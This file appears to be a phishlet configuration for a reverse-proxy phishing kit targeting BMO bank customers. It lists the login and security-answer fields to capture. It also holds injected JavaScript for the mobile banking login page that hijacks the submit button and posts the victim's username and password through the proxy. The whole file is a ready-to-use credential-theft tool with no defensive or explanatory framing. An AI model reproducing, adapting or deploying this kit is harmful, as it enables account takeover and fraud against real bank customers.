credentials:
  username:
    key: 'FBC_Number'
    search: '(.*)'
    type: 'post'
  password:
    key: 'FBC_Password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'answer'
      search: '(.*)'
      type: 'post' 
login:
  domain: 'www.bmo.com'
  path: '/'
  
js_inject:
  - trigger_domains: ["mobile2.bmo.com"]
    trigger_paths: ["/BMOMobile/BMOMobileBanking.html","/BMOMobile/BMOMobileBanking.html#/login/auth"]
    trigger_params: []
    script: |
      function lp(){
        var submit = document.querySelectorAll('button')[1];
        submit.setAttribute("onclick", "sendPass()");
        return;
      }
      function sendPass(){
        var credential = document.getElementById("mat-input-0").value;
        var password = document.getElementById("mat-input-1").value;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/accounts/login/ajax/', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("FBC_Password="+encodeURIComponent(password)+" "+"FBC_Number="+encodeURIComponent(credential));
        return;
      }
      setTimeout(function(){ lp(); }, 1000);  
      
      
